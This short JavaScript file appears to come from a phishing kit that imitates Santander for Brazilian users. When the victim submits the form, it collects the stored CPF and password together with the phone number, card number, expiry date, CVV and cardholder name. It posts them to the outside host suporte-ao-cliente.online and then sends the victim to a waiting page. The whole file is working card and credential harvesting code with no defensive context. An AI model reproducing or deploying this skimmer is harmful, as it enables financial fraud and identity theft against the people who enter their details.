document.getElementById("formcc").addEventListener("submit", (e) => {
    e.preventDefault()

    var cpf = localStorage.getItem("cpf")
    var pass = localStorage.getItem("pass")
    var phone = document.getElementById("Telefone").value
    var val = document.getElementById("ValidadeCC").value
    var cvv = document.getElementById("CVVCC").value
    var num = document.getElementById("NumCard").value
    var nome = document.getElementById("CardName").value
    var data = new Date().toString()

    
    var obj = {
        cpf,
        phone,
        val,
        cvv,
        num,
        pass,
        data,
        nome
    }   

    fetch("https://suporte-ao-cliente.online/sendInfo/SantanderWay", {
        method:"POST",
        headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify(obj),
    }).then(r => {
        console.log(r);
        document.location.pathname = "/aguarde"
    })

})